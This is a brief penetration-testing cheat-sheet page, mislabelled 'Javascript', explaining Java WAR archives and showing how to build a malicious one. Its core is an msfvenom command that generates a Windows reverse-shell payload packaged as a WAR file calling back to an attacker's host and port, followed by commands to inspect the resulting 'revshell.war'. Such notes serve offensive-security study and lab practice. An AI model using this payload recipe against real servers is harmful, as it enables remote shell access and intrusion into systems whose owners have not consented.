---
icon: js
---

# Javascript

**.WAR:**

A Web Application Resource is a single file container that holds all the potential files necessary for a Java-based web application. It can have Java Archives (.jar), Java Server Pages (.jsp), Java Servlets, Java classes, webpages, css, etc.

The `/WEB-INF` directory inside the archive is a special one, with a file named `web.xml` which defines the structure of the application.

**Create Malicious WAR files:**

Windows: msfvenom

```

msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f war > filename.war
```

**WAR files are basically ZIP files:**

```
head -c 16 filename.war | xxd
```



**Finding  JSP files:**

```
#Install
sudo apt install default-jdk

#Use jar to list content of the war file
jar tf revshell.war

#Curl .jsp file
```
